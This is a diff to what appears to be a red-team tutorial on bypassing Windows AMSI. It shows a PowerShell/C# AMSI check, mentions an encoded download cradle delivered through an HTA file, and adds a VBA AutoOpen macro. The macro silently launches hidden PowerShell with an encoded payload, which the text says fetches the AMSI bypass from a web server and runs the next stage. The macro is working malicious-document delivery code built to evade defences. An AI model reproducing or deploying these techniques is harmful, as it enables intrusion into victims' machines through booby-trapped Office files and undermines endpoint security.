@@ -16,7 +16,6 @@ AMSI can be used to detect malicious code within a number of scripting engines s
 The following code has been slightly modified to perform a check to verify whether AMSI has been disabled:
 
 ```
-
 Ref = (
 "System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
 "System.Runtime.InteropServices, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a"
@@ -108,7 +107,6 @@ namespace AMSI {
 "@
 
 Add-Type -ReferencedAssemblies $Ref -TypeDefinition $Source -Language CSharp
-
 ```
 
 The checks for AMSI and the delivery methods were taken from RastaMouse's AMSI blog posts:
@@ -149,3 +147,15 @@ The encoded cradle can then be placed in a HTA file, such as that below which ha
 These methods would only be ideal if the environment does not perform adequate logging against PowerShell and the target runs PowerShell normally within the environment, otherwise these are clear indicators of compromise.
 
 AMSI bypasses can also be implemented in a number of other scripting techniques, the following provides details on implementing these bypasses avoiding PowerShell.
+
+To achieve the same outcome, it is possible to add the following VBA code to a Macro which when executed through Office, such as Word will call out to the web server and pull down the AMSI bypass code and then execute the next stage:
+
+```
+Sub AutoOpen()
+
+Set obj = GetObject("new:C08AFD90-F2A1-11D1-8455-00A0C91F3880")
+
+obj.Document.Application.ShellExecute "powershell", "-nop -w 1 -enc PAYLOAD_HERE", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0", Null, 0
+
+End Sub
+```
